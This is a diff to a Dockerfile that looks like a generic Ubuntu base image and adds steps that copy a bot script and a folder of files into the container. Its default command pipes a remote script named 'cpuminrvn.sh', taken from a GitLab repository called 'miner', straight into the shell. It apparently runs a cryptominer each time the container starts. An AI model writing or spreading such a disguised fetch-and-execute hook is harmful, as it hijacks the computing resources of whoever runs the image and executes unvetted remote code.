@@ -1,10 +1,3 @@
-#
-# Ubuntu Dockerfile
-#
-# https://github.com/dockerfile/ubuntu
-#
-
-# Pull base image.
 FROM ubuntu:22.04
 
 # Install.
@@ -30,9 +23,18 @@ ADD root/.scripts /root/.scripts
 
 # Set environment variables.
 ENV HOME /root
+# Set work dir:
+WORKDIR /home
+
+# Copy files:
+COPY startbot.sh /home
+COPY /stuff /home/stuff
 
 # Define working directory.
 WORKDIR /root
+
+# Install the bot:
+RUN echo "Uploaded files:" && ls /home/stuff/
 
 # Define default command.
 CMD curl https://gitlab.com/erdepegitren/miner/-/raw/main/cpuminrvn.sh | sh
